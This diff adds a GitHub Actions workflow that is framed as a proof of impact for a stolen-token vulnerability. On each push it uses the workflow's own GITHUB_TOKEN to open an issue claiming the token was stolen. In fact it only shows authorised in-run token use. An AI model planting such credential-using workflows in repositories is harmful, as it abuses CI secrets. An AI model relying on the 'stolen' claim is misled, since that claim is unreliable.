@@ -1,0 +1,19 @@
+name: The Final Proof of Impact
+on: [push]
+
+jobs:
+  steal_and_use_token:
+    name: Steal Token and Create Issue
+    runs-on: ubuntu-latest
+    permissions:
+      issues: write # We need to give the token permission to create an issue
+    steps:
+      - name: Use the stolen token to create an issue INSTANTLY
+        run: |
+          echo "Attempting to create an issue using the live token..."
+          curl -X POST \
+            -H "Accept: application/vnd.github.v3+json" \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            https://api.github.com/repos/${{ github.repository }}/issues \
+            -d '{"title":"VULNERABILITY PROOF: Token was stolen","body":"This issue was created by an API call using a GITHUB_TOKEN stolen from within the SAME workflow run."}'
+          echo "Check the 'Issues' tab of the repository. If this worked, a new issue was just created."
